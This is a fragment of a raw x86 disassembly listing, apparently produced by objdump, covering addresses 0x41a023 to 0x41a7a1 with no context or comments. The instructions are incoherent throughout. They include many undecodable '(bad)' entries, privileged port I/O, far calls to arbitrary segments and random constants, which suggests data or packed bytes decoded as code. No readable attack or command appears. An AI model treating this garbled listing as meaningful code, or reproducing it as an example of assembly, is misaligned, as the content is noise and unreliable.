  41a023:	xor    ebx,DWORD PTR [ebx-0x1213843e]
  41a029:	or     ecx,DWORD PTR [ecx+0x5]
  41a02c:	or     ebp,esi
  41a02e:	scas   eax,DWORD PTR es:[edi]
  41a02f:	bound  edi,QWORD PTR [si+0x489b]
  41a034:	inc    eax
  41a035:	pop    eax
  41a036:	in     eax,dx
  41a037:	sbb    DWORD PTR [eax-0x6a3e0e4d],ebx
  41a03d:	add    eax,0xdb020bdf
  41a042:	aam    0x17
  41a044:	xor    eax,0x7cdb7def
  41a049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a04a:	call   0x2de2:0xe96ee390
  41a051:	dec    eax
  41a052:	jl     0x41a03f
  41a054:	inc    ebp
  41a055:	sahf   
  41a056:	call   DWORD PTR [ecx]
  41a058:	mov    edi,0xcd239bc2
  41a05d:	fwait
  41a05e:	dec    ebp
  41a05f:	cld    
  41a060:	mov    ds:0xa8a39f64,al
  41a065:	pop    eax
  41a066:	jae    0x41a0c0
  41a068:	jg     0x41a051
  41a06a:	sub    ecx,DWORD PTR [ecx]
  41a06c:	sub    al,0xf6
  41a06e:	ficomp WORD PTR [ebx]
  41a070:	retf   
  41a071:	sub    BYTE PTR [edx],cl
  41a073:	push   ss
  41a074:	leave  
  41a075:	pushf  
  41a076:	add    eax,DWORD PTR [edi+ebx*2]
  41a079:	lods   eax,DWORD PTR ds:[esi]
  41a07a:	dec    ebp
  41a07b:	pop    edx
  41a07c:	int    0x53
  41a07e:	mov    cl,0x60
  41a080:	xchg   ebp,eax
  41a081:	nop
  41a082:	jecxz  0x41a0dc
  41a084:	retf   
  41a085:	sti    
  41a086:	cmp    al,0x6a
  41a088:	ja     0x41a059
  41a08a:	clc    
  41a08b:	neg    DWORD PTR [esi+0x17]
  41a08e:	pop    ds
  41a08f:	pop    ds
  41a090:	shr    DWORD PTR [esi+ecx*8],1
  41a093:	daa    
  41a094:	xor    bl,bh
  41a096:	adc    esi,DWORD PTR [edx+ecx*1+0x2e]
  41a09a:	pop    esi
  41a09b:	jo     0x41a060
  41a09d:	retf   
  41a09e:	dec    eax
  41a09f:	(bad)  
  41a0a0:	lea    esi,[esi]
  41a0a2:	pop    edi
  41a0a3:	xor    eax,0xab48b393
  41a0a8:	mov    ecx,0x270b5947
  41a0ad:	fs pop edx
  41a0af:	lods   eax,DWORD PTR ds:[esi]
  41a0b0:	mov    ebx,0xbc7e42a8
  41a0b5:	lock pop eax
  41a0b7:	shr    DWORD PTR [eax],1
  41a0b9:	rcl    BYTE PTR [ebx+0x50a781e],1
  41a0bf:	lods   eax,DWORD PTR ds:[esi]
  41a0c0:	js     0x41a102
  41a0c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0c3:	mov    edi,0x8c1a17a1
  41a0c8:	fcmovu st,st(0)
  41a0ca:	in     al,dx
  41a0cb:	inc    edx
  41a0cc:	mov    esi,DWORD PTR [edx-0x43797c6a]
  41a0d2:	mov    esi,DWORD PTR ds:0x56cac68
  41a0d8:	imul   ebx,DWORD PTR [edx],0xa0e0b710
  41a0de:	dec    ecx
  41a0df:	aaa    
  41a0e0:	aad    0xe
  41a0e2:	into   
  41a0e3:	ds retf 
  41a0e5:	test   WORD PTR [edi+0xc476d99],dx
  41a0ec:	ds jno 0x41a16c
  41a0ef:	je     0x41a080
  41a0f1:	rcr    BYTE PTR [esi+0x362d8a3a],0xba
  41a0f8:	popf   
  41a0f9:	retf   
  41a0fa:	jnp    0x41a0b1
  41a0fc:	and    al,0xfe
  41a0fe:	test   DWORD PTR [edx-0x50],ecx
  41a101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a102:	mov    eax,ds:0x63c04b27
  41a107:	inc    ebp
  41a108:	stc    
  41a109:	cmp    eax,0x440fc3c5
  41a10e:	jbe    0x41a0a8
  41a110:	or     al,BYTE PTR [esi]
  41a112:	cmp    edx,ebp
  41a114:	pop    es
  41a115:	sub    esp,DWORD PTR [esp+ebp*8-0x44]
  41a119:	cli    
  41a11a:	imul   esi,DWORD PTR [edi-0x764f7009],0x595f9955
  41a124:	sub    al,0x1b
  41a126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a127:	jecxz  0x41a146
  41a129:	xor    DWORD PTR ds:0x540ba6a8,esi
  41a12f:	sub    cl,BYTE PTR [esi+0x1f]
  41a132:	sub    edi,DWORD PTR [eax]
  41a134:	imul   DWORD PTR [eax]
  41a136:	push   edx
  41a137:	stos   BYTE PTR es:[edi],al
  41a138:	push   ebp
  41a139:	dec    edi
  41a13a:	sub    al,0xf7
  41a13c:	sbb    edi,DWORD PTR [ebx+eiz*1]
  41a13f:	js     0x41a1a3
  41a141:	pop    eax
  41a142:	jbe    0x41a1b1
  41a144:	leave  
  41a145:	xchg   esp,eax
  41a146:	cmp    DWORD PTR [eax-0x1b9085a2],ebp
  41a14c:	cmp    ah,BYTE PTR [ecx+0x39]
  41a14f:	mov    al,ds:0x7c61f600
  41a154:	pop    eax
  41a155:	aaa    
  41a156:	jle    0x41a0ff
  41a158:	sub    BYTE PTR [ebp+0x4db33332],0xff
  41a15f:	inc    esp
  41a160:	jbe    0x41a162
  41a162:	push   ecx
  41a163:	cli    
  41a164:	xor    esi,esp
  41a166:	nop
  41a167:	or     DWORD PTR [edi],edi
  41a169:	mov    edx,0x6534a389
  41a16e:	cs or  eax,0xbd4c86c1
  41a174:	cmp    eax,0xa2724e8a
  41a179:	shr    BYTE PTR [edi+edx*4-0x20],cl
  41a17d:	pop    eax
  41a17e:	push   eax
  41a17f:	or     DWORD PTR [eax-0xd],eax
  41a182:	ds stc 
  41a184:	or     bh,BYTE PTR ss:[ecx]
  41a187:	cld    
  41a188:	jl     0x41a117
  41a18a:	mov    ah,0x5b
  41a18c:	push   edx
  41a18d:	(bad)  
  41a18e:	(bad)  
  41a18f:	lea    eax,[ebp+ecx*4+0x428d9eb6]
  41a196:	popa   
  41a197:	sub    eax,0x8e10bf48
  41a19c:	mov    dl,BYTE PTR [edi]
  41a19e:	and    esi,ebx
  41a1a0:	cmc    
  41a1a1:	stos   DWORD PTR es:[edi],eax
  41a1a2:	mov    al,ds:0x52645b23
  41a1a7:	pop    esi
  41a1a8:	mov    cl,BYTE PTR [ebp+0x6b3e8aea]
  41a1ae:	retf   0xaaa
  41a1b1:	sub    eax,0xedbfb21e
  41a1b6:	lds    eax,FWORD PTR [eax]
  41a1b8:	mov    edi,0x2f8b11c5
  41a1bd:	mov    edx,0xcd4821e8
  41a1c2:	(bad)  
  41a1c3:	retf   0xfb3f
  41a1c6:	push   0x5046e9a3
  41a1cb:	(bad)  
  41a1cd:	stos   DWORD PTR es:[edi],eax
  41a1ce:	in     eax,dx
  41a1cf:	xchg   edi,eax
  41a1d0:	loope  0x41a194
  41a1d2:	jns    0x41a1ca
  41a1d4:	repz inc eax
  41a1d6:	fs push ebx
  41a1d8:	dec    ebp
  41a1d9:	mov    ebx,0x7e90d3a9
  41a1de:	jnp    0x41a205
  41a1e0:	mov    ebx,0xd805823e
  41a1e5:	sbb    al,0x48
  41a1e7:	lods   al,BYTE PTR ds:[esi]
  41a1e8:	shl    BYTE PTR [ecx],0x19
  41a1eb:	dec    ebx
  41a1ec:	sbb    edx,DWORD PTR [ebp-0x3b]
  41a1ef:	mov    al,ds:0x3521df4b
  41a1f4:	lahf   
  41a1f5:	pusha  
  41a1f6:	sbb    eax,0x4a4d754b
  41a1fb:	push   0x2
  41a1fd:	and    BYTE PTR [edi],al
  41a1ff:	pop    esp
  41a200:	add    al,0xc6
  41a202:	jp     0x41a204
  41a204:	dec    edi
  41a205:	push   ecx
  41a206:	loop   0x41a1a0
  41a208:	adc    edx,ecx
  41a20a:	cli    
  41a20b:	iret   
  41a20c:	mov    BYTE PTR ds:0x3be0d7bc,cl
  41a212:	lock test al,0x2c
  41a215:	rcr    BYTE PTR [edx+edi*4+0x77],cl
  41a219:	cdq    
  41a21a:	ds push eax
  41a21c:	push   eax
  41a21d:	(bad)  
  41a21e:	pop    edx
  41a21f:	mov    esi,0x967fb80c
  41a224:	mov    ch,0x40
  41a226:	pushf  
  41a227:	fld    QWORD PTR [edi-0x10]
  41a22a:	shr    BYTE PTR [eax+0x62],cl
  41a22d:	neg    DWORD PTR [esp-0x3741ae82]
  41a234:	fnstcw WORD PTR [ecx+0x3b]
  41a237:	push   ecx
  41a238:	pushf  
  41a239:	inc    ebx
  41a23a:	sub    al,0xb7
  41a23c:	popw   ds
  41a23e:	lods   eax,DWORD PTR ds:[esi]
  41a23f:	out    dx,eax
  41a240:	xor    WORD PTR [edi],bp
  41a243:	and    ah,0xca
  41a246:	loopne 0x41a1e7
  41a248:	xchg   edx,eax
  41a249:	mov    ch,bh
  41a24b:	mov    bh,0xf1
  41a24d:	enter  0xb763,0xb7
  41a251:	push   ds
  41a252:	jns    0x41a27e
  41a254:	int3   
  41a255:	pop    esp
  41a256:	mov    esp,0x12902615
  41a25b:	jmp    0x41a25b
  41a25d:	pop    ecx
  41a25e:	mov    bh,cl
  41a260:	fdivp  st(6),st
  41a262:	pop    ds
  41a263:	jg     0x41a256
  41a265:	inc    ecx
  41a266:	sbb    eax,0x2d286cae
  41a26b:	jno    0x41a227
  41a26d:	mov    edi,0x87d5ce75
  41a272:	and    edi,DWORD PTR [edi+0x3d]
  41a275:	jge    0x41a2d2
  41a277:	retf   0x6662
  41a27a:	mov    edx,0x607d8be5
  41a27f:	aaa    
  41a280:	adc    eax,ecx
  41a282:	jp     0x41a2b2
  41a284:	sbb    DWORD PTR [esi+ebp*1-0x7eb12ef5],esp
  41a28b:	repnz mov dl,0xff
  41a28e:	mov    al,0xc4
  41a290:	mov    bh,0x51
  41a292:	jg     0x41a235
  41a294:	cmp    al,0x68
  41a296:	mov    esi,0x7545df11
  41a29b:	in     eax,dx
  41a29c:	add    BYTE PTR ds:0x2aea7424,dl
  41a2a2:	dec    ebp
  41a2a3:	xchg   esi,eax
  41a2a4:	jbe    0x41a2e9
  41a2a6:	push   es
  41a2a7:	mov    dl,0x63
  41a2a9:	cmc    
  41a2aa:	into   
  41a2ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2ac:	cmp    DWORD PTR [ebx+0x7201f95f],eax
  41a2b2:	mov    bl,0x1
  41a2b4:	sbb    DWORD PTR [ebx],ebp
  41a2b6:	out    0xd7,al
  41a2b8:	jae    0x41a2f9
  41a2ba:	dec    edi
  41a2bb:	icebp  
  41a2bc:	jecxz  0x41a33c
  41a2be:	push   0x804133ce
  41a2c3:	jle    0x41a2dd
  41a2c5:	aad    0x48
  41a2c7:	daa    
  41a2c8:	sub    eax,DWORD PTR [esi+eax*1-0x5b30600b]
  41a2cf:	je     0x41a342
  41a2d1:	and    BYTE PTR [edx],dh
  41a2d3:	test   BYTE PTR [ebx+ecx*2-0x52],ah
  41a2d7:	xor    cl,BYTE PTR [edx-0x11ea6bbb]
  41a2dd:	pusha  
  41a2de:	call   0x72cf:0xe15d0267
  41a2e5:	mov    bh,bh
  41a2e7:	int    0xa3
  41a2e9:	lods   al,BYTE PTR ds:[esi]
  41a2ea:	data16 cmp al,0xe3
  41a2ed:	das    
  41a2ee:	mov    dh,0x6
  41a2f0:	lods   eax,DWORD PTR ds:[esi]
  41a2f1:	sub    bl,BYTE PTR [edx-0x1a3bcf5f]
  41a2f7:	jp     0x41a282
  41a2f9:	ret    
  41a2fa:	adc    bl,dl
  41a2fc:	inc    ebp
  41a2fd:	lods   al,BYTE PTR ds:[esi]
  41a2fe:	mov    WORD PTR [ebp-0x4ea27a26],?
  41a304:	dec    ecx
  41a305:	cmp    esi,0x1
  41a308:	cmp    DWORD PTR [esi-0xe264c0a],ebx
  41a30e:	and    bh,BYTE PTR [eax+0x63]
  41a311:	xor    esp,ebp
  41a313:	inc    esp
  41a314:	jecxz  0x41a325
  41a316:	(bad)  
  41a317:	sti    
  41a318:	pop    ds
  41a319:	cmp    BYTE PTR [ebx],al
  41a31b:	mov    al,0xa7
  41a31d:	xchg   ecx,eax
  41a31e:	pop    ds
  41a31f:	addr16 aas 
  41a321:	lock or eax,0x97135d83
  41a327:	inc    edx
  41a328:	(bad)
  41a32c:	adc    dh,bl
  41a32e:	dec    ebp
  41a32f:	(bad)  
  41a330:	in     eax,0xae
  41a332:	outs   dx,BYTE PTR ds:[esi]
  41a333:	and    al,0x21
  41a335:	(bad)  
  41a336:	sbb    cl,BYTE PTR [ebp-0x690d41b2]
  41a33c:	mov    bl,0x9f
  41a33e:	or     ebp,DWORD PTR [esi-0x42]
  41a341:	in     eax,dx
  41a342:	test   DWORD PTR [eax+0x1e],edx
  41a345:	mov    al,0xe6
  41a347:	mov    eax,ds:0x5c11b8a5
  41a34c:	out    0x1c,eax
  41a34e:	jmp    0xc893:0xede9c8d5
  41a355:	sub    eax,0x9187c112
  41a35a:	call   0xcb8c:0x9094a315
  41a361:	mov    ?,WORD PTR [ebp+0x6c]
  41a364:	mov    cl,0x6c
  41a366:	das    
  41a367:	nop
  41a368:	out    dx,al
  41a369:	cmp    DWORD PTR [esi-0x53f7b11e],ebp
  41a36f:	xor    dl,BYTE PTR [edx-0x3257f268]
  41a375:	xor    bh,BYTE PTR [edx]
  41a377:	outs   dx,DWORD PTR ds:[esi]
  41a378:	add    BYTE PTR [esi-0x5f],cl
  41a37b:	push   ss
  41a37c:	mov    esi,0x7adf12f5
  41a381:	cmp    bh,dl
  41a383:	jecxz  0x41a30e
  41a385:	mov    ch,0x1d
  41a387:	push   ebx
  41a388:	mov    al,0xe8
  41a38a:	sar    ecx,0x6c
  41a38d:	mov    eax,0x7ed9fd40
  41a392:	ret    
  41a393:	jge    0x41a3cc
  41a395:	test   al,0xd4
  41a397:	push   eax
  41a398:	dec    bh
  41a39a:	cli    
  41a39b:	into   
  41a39c:	stc    
  41a39d:	push   ebp
  41a39e:	dec    eax
  41a39f:	push   ebx
  41a3a0:	lods   eax,DWORD PTR ds:[esi]
  41a3a1:	test   DWORD PTR [ecx-0x6],esi
  41a3a4:	inc    esi
  41a3a5:	out    dx,al
  41a3a6:	pop    eax
  41a3a7:	ins    BYTE PTR es:[edi],dx
  41a3a8:	std    
  41a3a9:	dec    ecx
  41a3aa:	or     DWORD PTR [esi+0x41],ebx
  41a3ad:	shl    BYTE PTR [esi-0xc60ba5a],0xfc
  41a3b4:	inc    edi
  41a3b5:	push   ecx
  41a3b6:	psubusb mm5,QWORD PTR [eax+0x4a]
  41a3ba:	clc    
  41a3bb:	(bad)  
  41a3bc:	fsub   st(2),st
  41a3be:	xchg   ebp,eax
  41a3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3c0:	push   esp
  41a3c1:	mov    esp,0xc31942e9
  41a3c6:	call   DWORD PTR [ecx-0x65409181]
  41a3cc:	push   ebp
  41a3cd:	(bad)  
  41a3ce:	cli    
  41a3cf:	daa    
  41a3d0:	popf   
  41a3d1:	sbb    DWORD PTR [esi+0x220ae1b4],ecx
  41a3d7:	sub    eax,0x3b80f370
  41a3dc:	les    ecx,FWORD PTR [edx-0x454b853c]
  41a3e2:	nop
  41a3e3:	add    ah,BYTE PTR [edx+edi*4-0x1a]
  41a3e7:	(bad)  
  41a3e8:	fcom   DWORD PTR [eax+0x4e]
  41a3eb:	dec    edi
  41a3ec:	es ins BYTE PTR es:[edi],dx
  41a3ee:	add    al,0x47
  41a3f0:	loope  0x41a384
  41a3f2:	xor    BYTE PTR [ebx-0x4f2563a4],dh
  41a3f8:	sub    ebp,DWORD PTR [edi+0x5dc06cd9]
  41a3fe:	hlt    
  41a3ff:	jle    0x41a3b8
  41a401:	inc    ecx
  41a402:	aad    0xfc
  41a404:	inc    ebp
  41a405:	inc    esp
  41a406:	or     DWORD PTR [ebp-0x20ba6e03],ecx
  41a40c:	pop    ebp
  41a40d:	in     eax,0x61
  41a40f:	iret   
  41a410:	push   esp
  41a411:	push   0x3b2aaafb
  41a416:	xchg   ebx,eax
  41a417:	cwde   
  41a418:	cmp    al,BYTE PTR [ebx-0x5b]
  41a41b:	xlat   BYTE PTR ds:[ebx]
  41a41c:	xor    esp,DWORD PTR [edi+eiz*1-0x36]
  41a420:	sub    dh,BYTE PTR [edx+eax*4]
  41a423:	inc    esi
  41a424:	jl     0x41a456
  41a426:	fild   DWORD PTR [edx]
  41a428:	or     ah,BYTE PTR [ebx-0x5998e12e]
  41a42e:	pushf  
  41a42f:	out    dx,al
  41a430:	cdq    
  41a431:	aas    
  41a432:	push   edi
  41a433:	mov    ebp,0x60293134
  41a438:	(bad)  
  41a439:	repz mov ?,WORD PTR [esi]
  41a43c:	fidiv  DWORD PTR [ebx+ebx*2]
  41a43f:	pop    edi
  41a440:	(bad)  
  41a441:	push   ecx
  41a442:	jbe    0x41a412
  41a444:	into   
  41a445:	fnstsw WORD PTR [edi-0xb5e1fbf]
  41a44b:	js     0x41a47d
  41a44d:	dec    ebx
  41a44e:	xchg   edi,eax
  41a44f:	cli    
  41a450:	or     eax,0xf759003a
  41a455:	ret    
  41a456:	icebp  
  41a457:	push   esi
  41a458:	dec    edx
  41a459:	push   ecx
  41a45a:	fst    DWORD PTR [ecx-0x688790db]
  41a460:	or     eax,0xf9da3d81
  41a465:	out    dx,al
  41a466:	les    edx,FWORD PTR ds:0x9732e3b9
  41a46c:	ja     0x41a478
  41a46e:	add    edi,DWORD PTR [edi+0x674ddb97]
  41a474:	sub    eax,0xd3650e21
  41a479:	mov    esi,0x7797f04b
  41a47e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a47f:	and    DWORD PTR [edi],esi
  41a481:	je     0x41a42b
  41a483:	and    bh,ah
  41a485:	(bad)  
  41a486:	push   edi
  41a487:	push   edi
  41a488:	cld    
  41a489:	adc    eax,0xc518d817
  41a48e:	int3   
  41a48f:	mov    esi,0x4b8aa2d7
  41a494:	lods   eax,DWORD PTR ds:[esi]
  41a495:	sub    DWORD PTR [ecx-0x2283f5d1],esi
  41a49b:	call   0x29c:0x2ccd6c0e
  41a4a2:	xor    dl,BYTE PTR [ecx+0x4cddcf1b]
  41a4a8:	mov    WORD PTR [edx-0x4],es
  41a4ab:	cli    
  41a4ac:	mov    edx,0xe18f2aa7
  41a4b1:	mov    esp,DWORD PTR [edi]
  41a4b3:	inc    edx
  41a4b4:	cmp    esi,edi
  41a4b6:	enter  0x1ef0,0xb
  41a4ba:	retf   
  41a4bb:	sar    esi,1
  41a4bd:	repnz fwait
  41a4bf:	mov    ebx,0x81da1304
  41a4c4:	sbb    al,0x6e
  41a4c6:	jnp    0x41a546
  41a4c8:	ret    0x942e
  41a4cb:	mov    edi,0x7e71f58
  41a4d0:	pop    ds
  41a4d1:	xor    eax,0x8c306a36
  41a4d6:	fisub  DWORD PTR [edx]
  41a4d8:	(bad)  
  41a4d9:	(bad)
  41a4dc:	adc    esi,DWORD PTR [esi+0x542d1157]
  41a4e2:	xbegin 0xfc4c33e7
  41a4e8:	gs stos DWORD PTR es:[di],eax
  41a4eb:	ins    DWORD PTR es:[edi],dx
  41a4ec:	in     eax,dx
  41a4ed:	pop    esi
  41a4ee:	mul    DWORD PTR [ecx+0x50]
  41a4f1:	xchg   ebp,eax
  41a4f2:	retf   
  41a4f3:	mov    dh,bh
  41a4f5:	sub    eax,0x6ba0e7b1
  41a4fa:	sub    al,0xdc
  41a4fc:	sub    al,0x6e
  41a4fe:	sahf   
  41a4ff:	push   ss
  41a500:	jge    0x41a4e8
  41a502:	test   BYTE PTR [ebx-0x3d18c390],dl
  41a508:	adc    al,0x41
  41a50a:	data16 aas 
  41a50c:	mov    esi,esi
  41a50e:	adc    al,0x71
  41a510:	shl    DWORD PTR [ebp+eiz*4+0x79fb6824],1
  41a517:	lods   al,BYTE PTR ds:[esi]
  41a518:	clc    
  41a519:	and    eax,0x98560f76
  41a51e:	je     0x41a56a
  41a520:	mov    ds:0xe8f4e36e,eax
  41a525:	jl     0x41a511
  41a527:	imul   esp,DWORD PTR [ecx-0x2054d5fb],0x6ad6c61d
  41a531:	fldenv [esi+0x315167f0]
  41a537:	pop    ss
  41a538:	xchg   BYTE PTR [eax-0x1186f642],al
  41a53e:	cmp    BYTE PTR [ecx+0x2f],ah
  41a541:	xor    BYTE PTR [eax],dl
  41a543:	inc    ecx
  41a544:	(bad)  
  41a545:	ficom  WORD PTR [ebp+esi*2+0x7dc9cc00]
  41a54c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a54d:	test   al,0x75
  41a54f:	mov    bl,0x26
  41a551:	arpl   di,sp
  41a553:	xchg   esp,eax
  41a554:	out    0x5a,al
  41a556:	aaa    
  41a557:	dec    eax
  41a558:	mov    ah,ah
  41a55a:	loopne 0x41a5bb
  41a55c:	and    al,BYTE PTR [edx+0x27]
  41a55f:	enter  0xf175,0xa3
  41a563:	adc    ch,al
  41a565:	inc    ebx
  41a567:	push   eax
  41a568:	add    DWORD PTR es:[edx-0x160f9ce2],0x43
  41a570:	mov    ch,0x50
  41a572:	add    eax,0xf76563d6
  41a577:	mov    edx,0xbffa99f5
  41a57c:	test   al,0x51
  41a57e:	popa   
  41a57f:	cld    
  41a580:	add    esi,eax
  41a582:	mov    bh,0x4a
  41a584:	rcr    DWORD PTR [eax],0x50
  41a587:	lea    ecx,[edi-0x31120863]
  41a58d:	xchg   edi,eax
  41a58e:	pusha  
  41a58f:	cli    
  41a590:	mov    eax,0xad122ff3
  41a595:	push   ss
  41a596:	push   0x65727a42
  41a59b:	mov    dl,0x29
  41a59d:	clc    
  41a59e:	pop    edi
  41a59f:	(bad)  
  41a5a0:	pusha  
  41a5a1:	and    BYTE PTR ds:0x5096e008,cl
  41a5a7:	mov    esp,0x9d57dd2e
  41a5ac:	pop    eax
  41a5ad:	sbb    ah,BYTE PTR ds:0xbcaccedc
  41a5b3:	adc    DWORD PTR [esi+0x7e],0x43
  41a5b7:	test   bh,0x6
  41a5ba:	mov    esi,0x1e500c9f
  41a5bf:	add    al,0xf8
  41a5c1:	fistp  QWORD PTR ss:[edi]
  41a5c4:	pop    edi
  41a5c5:	jl     0x41a620
  41a5c7:	push   ecx
  41a5c8:	xor    BYTE PTR [edx-0x2f3b0d9],0x68
  41a5cf:	or     bh,bh
  41a5d1:	sbb    dl,BYTE PTR [ecx]
  41a5d3:	jne    0x41a594
  41a5d5:	out    0x81,al
  41a5d7:	mov    ebp,ecx
  41a5d9:	(bad)  
  41a5db:	or     eax,0x2912ad06
  41a5e0:	fbstp  TBYTE PTR [ebx-0x459a81ad]
  41a5e6:	mov    ebx,DWORD PTR [eax-0x6588611b]
  41a5ec:	jnp    0x41a592
  41a5ee:	push   DWORD PTR [edi*1+0x4943bcd3]
  41a5f5:	jbe    0x41a5ce
  41a5f7:	jmp    0xf07d:0xfec73113
  41a5fe:	mov    esp,0xa89435a3
  41a603:	(bad)  
  41a604:	push   ecx
  41a605:	arpl   cx,si
  41a607:	jno    0x41a605
  41a609:	push   0x6f
  41a60b:	rol    DWORD PTR [esi-0x9135ec2],cl
  41a611:	scas   al,BYTE PTR es:[edi]
  41a612:	fld    DWORD PTR ds:0x4cb2423c
  41a618:	je     0x41a66e
  41a61a:	xchg   ecx,eax
  41a61b:	hlt    
  41a61c:	mov    ss,WORD PTR [edi]
  41a61e:	sbb    BYTE PTR [esi],dl
  41a620:	loope  0x41a666
  41a622:	sbb    eax,DWORD PTR [esi]
  41a624:	xchg   esi,eax
  41a625:	bound  ebx,QWORD PTR [ebx+0xc]
  41a628:	xchg   ebx,eax
  41a629:	jno    0x41a5c0
  41a62b:	push   ebp
  41a62c:	mov    eax,edx
  41a62e:	lahf   
  41a62f:	lahf   
  41a630:	js     0x41a5ba
  41a632:	fld    TBYTE PTR [edx]
  41a634:	xor    eax,0x37
  41a637:	fcomp  QWORD PTR [esi+0x1ece9d2]
  41a63d:	push   0x1923c52
  41a642:	adc    BYTE PTR [ebp-0x6],bh
  41a645:	retf   
  41a646:	stc    
  41a647:	mov    esp,DWORD PTR [eax+0x42]
  41a64a:	fcmovnbe st,st(2)
  41a64c:	inc    ebx
  41a64d:	call   0xab08ac7a
  41a652:	fsub   st(2),st
  41a654:	pushf  
  41a655:	mov    es,WORD PTR [esi]
  41a657:	(bad)  
  41a658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a659:	cmp    al,0x89
  41a65b:	and    al,0x2
  41a65d:	(bad)  
  41a65e:	in     al,0x5d
  41a660:	cmp    BYTE PTR [ebx+0x67],ch
  41a663:	jo     0x41a66c
  41a665:	sbb    esi,esi
  41a667:	rol    dl,cl
  41a669:	sub    DWORD PTR [ecx],eax
  41a66b:	sbb    eax,0x55360f24
  41a670:	test   eax,0xabe33ada
  41a675:	(bad)  
  41a676:	xor    BYTE PTR [edi+eax*8],ah
  41a679:	xchg   ecx,eax
  41a67a:	icebp  
  41a67b:	push   ebx
  41a67c:	loop   0x41a67d
  41a67e:	pushf  
  41a67f:	in     eax,dx
  41a680:	js     0x41a69e
  41a682:	dec    ebp
  41a683:	dec    ebp
  41a684:	sub    al,0xcc
  41a686:	stos   BYTE PTR es:[edi],al
  41a687:	aas    
  41a688:	icebp  
  41a689:	jg     0x41a635
  41a68b:	repnz sub bl,bh
  41a68e:	pop    ecx
  41a68f:	std    
  41a690:	(bad)  
  41a691:	lods   al,BYTE PTR ds:[esi]
  41a692:	addr16 out 0x80,al
  41a695:	sbb    dh,ch
  41a697:	push   edx
  41a698:	mov    bl,0x48
  41a69a:	sub    DWORD PTR [edx-0x56ed4734],0x1a
  41a6a1:	in     al,dx
  41a6a2:	cmp    edx,ebx
  41a6a4:	retf   
  41a6a5:	fs jbe 0x41a681
  41a6a8:	cli    
  41a6a9:	call   0x5591:0x7fe0cf85
  41a6b0:	mov    ch,0xb0
  41a6b2:	pushf  
  41a6b3:	addr16 mov dh,0x94
  41a6b6:	leave  
  41a6b7:	dec    ebp
  41a6b8:	cli    
  41a6b9:	mov    ds:0xa671139c,eax
  41a6be:	xchg   edx,eax
  41a6bf:	cmp    dl,BYTE PTR [eax]
  41a6c1:	mov    ds:0x4830dc8b,eax
  41a6c6:	icebp  
  41a6c7:	loop   0x41a744
  41a6c9:	test   DWORD PTR [ebp+0x6],ebx
  41a6cc:	(bad)  
  41a6ce:	jns    0x41a6f3
  41a6d0:	addr16 mov ebp,0xb00a5e11
  41a6d6:	fnstenv [edx+ebp*1]
  41a6d9:	sbb    eax,edi
  41a6db:	jnp    0x41a71e
  41a6dd:	loop   0x41a75d
  41a6df:	xor    bh,BYTE PTR [edi]
  41a6e1:	adc    dh,BYTE PTR [esi]
  41a6e3:	xchg   ebp,eax
  41a6e4:	ss pop esi
  41a6e6:	dec    esp
  41a6e7:	sbb    edi,DWORD PTR [ebx-0x767007db]
  41a6ed:	sbb    cl,al
  41a6ef:	aam    0x9b
  41a6f1:	pusha  
  41a6f2:	xor    cl,BYTE PTR [ecx+0x7b]
  41a6f5:	cwde   
  41a6f6:	push   ds
  41a6f7:	mov    edi,DWORD PTR [ebx+eiz*1+0xf]
  41a6fb:	jl     0x41a6cd
  41a6fd:	cmp    BYTE PTR [ebp-0x7c4b73df],al
  41a703:	in     eax,0xdc
  41a705:	or     al,0x8e
  41a707:	stc    
  41a708:	sbb    eax,0x2868dbcc
  41a70d:	rol    DWORD PTR [edx-0x5d],1
  41a710:	dec    esi
  41a711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a712:	jbe    0x41a780
  41a714:	in     eax,0xd4
  41a716:	xor    al,0xaf
  41a718:	les    edx,FWORD PTR [edi-0x45a8de25]
  41a71e:	pop    ss
  41a71f:	push   0x77
  41a721:	in     eax,0x5e
  41a723:	sub    DWORD PTR [eax*1-0x377379a6],0x5e
  41a72b:	xor    bl,BYTE PTR [ecx]
  41a72d:	jg     0x41a6be
  41a72f:	clc    
  41a730:	call   DWORD PTR cs:[esp+edi*2]
  41a734:	lahf   
  41a735:	jmp    0x4d4d7f6b
  41a73a:	pop    es
  41a73b:	dec    edx
  41a73c:	or     esi,DWORD PTR [edx+0x2ef59f10]
  41a742:	or     edi,ebx
  41a744:	stos   DWORD PTR es:[edi],eax
  41a745:	mov    eax,0x466749b3
  41a74a:	dec    ecx
  41a74b:	mov    dh,0xd8
  41a74d:	cmc    
  41a74e:	stos   DWORD PTR es:[edi],eax
  41a74f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a750:	jbe    0x41a73e
  41a752:	ja     0x41a6e6
  41a754:	in     al,dx
  41a755:	stc    
  41a756:	fcomp  DWORD PTR [ebx-0x1f]
  41a759:	inc    eax
  41a75a:	call   0x39d13ce
  41a75f:	clc    
  41a760:	push   ds
  41a761:	jnp    0x41a791
  41a763:	lods   al,BYTE PTR ds:[esi]
  41a764:	stos   BYTE PTR es:[edi],al
  41a765:	es mov edi,esp
  41a768:	inc    eax
  41a769:	and    eax,0x795783df
  41a76e:	dec    ebx
  41a76f:	gs iret 
  41a771:	jmp    0xa0a3:0x3a5710ff
  41a778:	ins    DWORD PTR es:[edi],dx
  41a779:	jno    0x41a711
  41a77b:	sub    BYTE PTR [edx+edx*8],ch
  41a77e:	jl     0x41a71a
  41a780:	fwait
  41a781:	scas   al,BYTE PTR es:[edi]
  41a782:	popf   
  41a783:	in     eax,0xa7
  41a785:	mov    al,ds:0xbc7abf83
  41a78a:	cmp    bl,al
  41a78c:	sbb    al,0xaa
  41a78e:	xchg   edx,eax
  41a78f:	jp     0x41a7ec
  41a791:	pop    ebx
  41a792:	dec    BYTE PTR ds:0xaaabc0b0
  41a798:	cmp    al,dh
  41a79a:	mov    BYTE PTR [ecx],al
  41a79c:	mov    eax,ds:0x6c6e5934
  41a7a1:	lahf   
